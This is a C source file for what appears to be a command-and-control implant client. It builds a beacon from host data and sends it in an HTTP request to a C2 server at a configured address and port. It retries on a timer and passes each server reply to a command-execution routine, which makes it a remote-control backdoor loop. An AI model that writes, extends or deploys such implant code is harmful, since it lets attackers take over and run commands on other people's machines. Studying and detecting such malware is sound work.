#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include "beacon.h"
#include "command.h"
#include "colors.h"

#define RHOST "127.0.0.1"
#define RPORT 4444
#define RPORT_STR "4444"
#define BEACON_RESP_MAX_SIZE 2048

#define ABORT (-1)
#define RETRY_LATER 0
#define OK 1

int timeout = 60;		// seconds

int connect_to_c2(const char *host, int port)
{
	int sockfd;

	/* Set host address and port */
	printf("[*] Setting c2 address and port...");
	struct sockaddr_in serv_addr;
	memset(&serv_addr, 0, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	serv_addr.sin_port = htons(RPORT);
	if (inet_pton(AF_INET, RHOST, &serv_addr.sin_addr) <= 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Creating socket...");
	if ((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	/* Set receive timeout on socket */
	struct timeval tv;
	tv.tv_sec = timeout;
	tv.tv_usec = 0;
	printf("[*] Setting timeout %d seconds...", tv.tv_sec);
	if (setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char *)&tv,
		       sizeof(struct timeval)) == -1) {
		printf("failed\n");
		return ABORT;
	}
	printf("done\n");

	printf("[*] Connecting to c2 server...");
	if (connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) <
	    0) {
		printf(RED("failed\n"));
		return RETRY_LATER;
	}
	printf("done\n");

	return sockfd;
}

#define HTTP_REQ_MAX_SIZE 2048

char *build_http_request(char *data)
{
	char *http_req = malloc(HTTP_REQ_MAX_SIZE);
	if (http_req != NULL) {
		sprintf(http_req, "GET /beacon HTTP/1.1\r\n"
			"Host: " RHOST ":" RPORT_STR "\r\n\r\n%s", data);
	}

	return http_req;
}

int send_data(int sockfd, char *data, size_t data_len)
{
	if (data == NULL)
		return ABORT;

	char *pos = data;

	while (data_len > 0) {
		int numsent = send(sockfd, pos, data_len, 0);
		if (numsent >= 0) {
			data_len -= numsent;
			if (data_len)
				pos += numsent;
		} else {
			printf("send: %s\n", strerror(errno));
			return RETRY_LATER;	/* Problems, retry later */
		}
	}

	return OK;
}

void get_beacon_resp(int sockfd, char **resp)
{
	char *buf = malloc(BEACON_RESP_MAX_SIZE);
	if (buf == NULL) {
		printf("malloc\n");
		*resp = NULL;
	}

	/* Should read HTTP header to make sure the entire reply
	   is received before moving on */
	printf("[*] Waiting for c2 server to reply...");
	fflush(stdout);
	int received = 0;
	ssize_t numread = recv(sockfd, buf, BEACON_RESP_MAX_SIZE, 0);
	if (numread > 0) {
		printf("received %d bytes\n", numread);
		received = 1;
	} else if (numread == 0) {
		printf("connection closed\n");
	} else if (numread == -1) {
		if (errno == EAGAIN && errno == EWOULDBLOCK) {
			printf("timed out\n");
		} else {
			printf("error\n");
		}
	}

	if (received == 1) {
		*resp = buf;
	} else {
		free(buf);
		*resp = NULL;
	}
}

int send_and_wait(char *request, size_t request_len, char **response)
{
	if (request == NULL || request_len == 0)
		return -1;	/* If no beacon can be retrieved, abort */

	int sockfd;
	int ret = connect_to_c2(RHOST, RPORT);
	if (ret == ABORT || ret == RETRY_LATER)
		return ret;

	sockfd = ret;

	ret = send_data(sockfd, request, request_len);
	if (ret == ABORT) {
		printf("[*] Closing socket\n");
		close(sockfd);
		return ABORT;
	} else if (ret == RETRY_LATER) {
		printf("[*] Could not send beacon, will retry\n");
		printf("[*] Closing socket\n");
		close(sockfd);
		return RETRY_LATER;
	}

	printf("[*] Beacon sent\n");

	get_beacon_resp(sockfd, response);

	printf("[*] Closing socket\n");
	close(sockfd);

	return OK;
}

int main(int argc, char *argv[])
{
	printf("[*] Acquiring beacon...");
	char *beacon = get_beacon();
	if (beacon == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done:\n") "%s", beacon);

	printf("[*] Building HTTP request...");
	char *http_request = build_http_request(beacon);
	if (http_request == NULL) {
		printf(RED("failed\n"));
		return -1;
	}
	printf(GREEN("done\n"));

	char *response = NULL;
	while (1) {
		int ret =
		    send_and_wait(http_request, strlen(http_request),
				  &response);
		if (ret == ABORT) {
			free(beacon);
			free(http_request);
			break;
		} else if (ret == RETRY_LATER) {
			printf(YELLOW
			       ("[*] Sleep %d seconds before retrying..."),
			       timeout);
			fflush(stdout);
			sleep(timeout);
			printf("done\n");
		} else if (response != NULL) {
			printf("[*] Server response:\n%s\n", response);
			printf("[*] Starting command execution...\n");
			exec_commands(response);
			printf(GREEN("[*] Commands executed\n"));
			free(response);
		}
	}

	return 0;
}
